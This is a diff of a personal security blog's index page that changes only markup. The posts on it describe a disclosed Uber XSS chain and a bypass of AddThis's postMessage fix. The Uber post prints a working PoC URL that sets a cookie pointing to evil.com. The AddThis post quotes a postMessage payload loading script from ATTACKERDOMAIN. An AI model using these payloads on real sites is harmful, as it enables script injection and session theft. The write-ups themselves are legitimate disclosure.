@@ -84,16 +84,13 @@
 
 
 
-<meta name="description">
 <meta property="og:type" content="website">
 <meta property="og:title" content="zhchbin">
 <meta property="og:url" content="http://zhchbin.github.io/index.html">
 <meta property="og:site_name" content="zhchbin">
-<meta property="og:description">
+<meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="zhchbin">
-<meta name="twitter:description">
-
 
 
 
@@ -314,7 +311,7 @@
 <h2 id="JSONP-Request"><a href="#JSONP-Request" class="headerlink" title="JSONP Request"></a>JSONP Request</h2><p>Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was <code>jsonp</code>, and my target domain was <code>https://get.uber.com</code>. Let’s look at what I had found at that time.</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idrCall: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a, b;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.idrCallPending ? <span class="keyword">void</span> <span class="number">0</span> : (<span class="keyword">this</span>.log(<span class="string">"making idr call"</span>),</span><br><span class="line">    a = <span class="keyword">this</span>.rfiServer ? <span class="keyword">this</span>.rfiServer : <span class="string">"a.rfihub.com"</span>,</span><br><span class="line">    b = <span class="keyword">this</span>.getProtocol() + <span class="string">"//"</span> + a + <span class="string">"/idr.js"</span>,</span><br><span class="line">    <span class="keyword">this</span>.jsonpGet(b, &#123;&#125;, <span class="keyword">this</span>.idrCallback, <span class="string">"cmZpSWRJbkNhY2hl"</span>),</span><br><span class="line">    <span class="keyword">this</span>.idrCallPending = !<span class="number">0</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
 <p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg" alt=""></p>
-<p>Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code>this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know <a href="https://stackoverflow.com/a/2067584" target="_blank" rel="external">the essence of JSONP</a>. The next step was searching everything about <code>rfiServer</code>.</p>
+<p>Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code>this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know <a href="https://stackoverflow.com/a/2067584" target="_blank" rel="noopener">the essence of JSONP</a>. The next step was searching everything about <code>rfiServer</code>.</p>
 <p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj20krdxhbj20tm0f042c.jpg" alt=""></p>
 <p>After reading through these lines of code:</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="keyword">this</span>.readCookie(<span class="string">"_rfiServer"</span>),</span><br><span class="line"><span class="literal">null</span> != a &amp;&amp; <span class="keyword">this</span>.setRfiServer(a),</span><br></pre></td></tr></table></figure>
@@ -325,7 +322,7 @@
 </ul>
 <p>What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?</p>
 <h2 id="The-Feature-of-Cookie"><a href="#The-Feature-of-Cookie" class="headerlink" title="The Feature of Cookie"></a>The Feature of Cookie</h2><p>Any subdomain of uber.com can set cookie with domain <code>.uber.com</code> to be used across subdomains. For instance, we can set cookie in <code>xxx.uber.com</code> using following code, then <code>get.uber.com</code> will use the cookie value.</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document<span class="class">.cookie</span> = <span class="string">'_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &apos;_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/&apos;</span><br></pre></td></tr></table></figure>
 <p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg" alt=""></p>
 <h2 id="XSS-of-uber-com-which-is-Out-of-Scope"><a href="#XSS-of-uber-com-which-is-Out-of-Scope" class="headerlink" title="XSS of .uber.com which is Out of Scope"></a>XSS of <redacted>.uber.com which is Out of Scope</redacted></h2><p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code>&lt;redacted&gt;.uber.com</code> for demo.</p>
 <p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg" alt=""></p>
@@ -338,7 +335,7 @@
 <li>Use reflected XSS of <code>&lt;redacted&gt;.uber.com</code> to set the value of <code>_rfiServer</code> cookie to <code>evil.com</code></li>
 <li>Visit <code>get.uber.com</code>, JSONP request to <code>https://evil.com/idr.js</code>, XSS of <code>get.uber.com</code> is done.</li>
 <li><p>The final PoC</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;redacted&gt;.uber.com/&lt;redacted&gt;?</span><br><span class="line">email=aaa"%20type%3d"image"%20src%3d1%20o&gt;nerror%3d"eval(decodeURIComponent(location.hash.substr(1)))</span><br><span class="line">#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//&lt;redacted&gt;.uber.com/&lt;redacted&gt;?</span></span><br><span class="line">email=aaa<span class="string">"%20type%3d"</span>image<span class="string">"%20src%3d1%20o&gt;nerror%3d"</span><span class="built_in">eval</span>(<span class="built_in">decodeURIComponent</span>(location.hash.substr(<span class="number">1</span>)))</span><br><span class="line">#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>Thanks for Uber. Reward: 5k</p>
 </li>
@@ -443,19 +440,19 @@
       
         
           
-            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>说明：这个漏洞是 <a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/" target="_blank" rel="external">https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/</a> 修复的绕过，目前已经报告给AddThis并得到修复。</p>
+            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>说明：这个漏洞是 <a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/" target="_blank" rel="noopener">https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/</a> 修复的绕过，目前已经报告给AddThis并得到修复。</p>
 <blockquote>
-<p>AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等<br>From <a href="https://zh.wikipedia.org/wiki/AddThis" target="_blank" rel="external">https://zh.wikipedia.org/wiki/AddThis</a></p>
+<p>AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等<br>From <a href="https://zh.wikipedia.org/wiki/AddThis" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/AddThis</a></p>
 </blockquote>
 <p>使用的例子有：</p>
 <p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30n0dmyqj20nd08o0wd.jpg" alt=""></p>
 <p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30nhwnasj20rq0bddho.jpg" alt=""></p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用这款插件，需要在网页上加入类似以下的代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Go to www.addthis.com/dashboard to customize your tools --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ceb912f1cca19"</span> <span class="attribute">async</span>=<span class="value">"async"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Go to www.addthis.com/dashboard to customize your tools --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ceb912f1cca19"</span> <span class="attr">async</span>=<span class="string">"async"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>当插件加载完成后，就会监听<code>message</code>事件。</p>
 <p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1fb3110ele5j21340em79m.jpg" alt=""></p>
 <p>看完前面提到的那篇文章之后，我们可以知道在这个事件处理函数中，如果<code>message</code>事件处理函数接收到一个 <em>合法来源</em> 的消息，消息内容如下：<code>at-share-bookmarklet://example.com/xss.js</code>时，就会动态在页面中插入指定的JS脚本。之前的漏洞是在这里根本没有检查消息的来源就直接加载执行导致了DOM XSS，原先的PoC：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">id</span>=<span class="value">"frame"</span> <span class="attribute">src</span>=<span class="value">"https://targetpage/using_addthis"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'frame'</span>).contentWindow.postMessage(<span class="string">'at-share-bookmarklet://ATTACKERDOMAIN/xss.js'</span>, <span class="string">'*'</span>);</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"frame"</span> <span class="attr">src</span>=<span class="string">"https://targetpage/using_addthis"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'frame'</span>).contentWindow.postMessage(<span class="string">'at-share-bookmarklet://ATTACKERDOMAIN/xss.js'</span>, <span class="string">'*'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>AddThis对这个漏洞进行的修复如下：</p>
 <ol>
 <li>添加检查当前窗口是不是被嵌套在：<code>iframe</code>, <code>frame</code>等标签里，如果是，则不监听<code>message</code>事件。</li>
@@ -641,7 +638,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
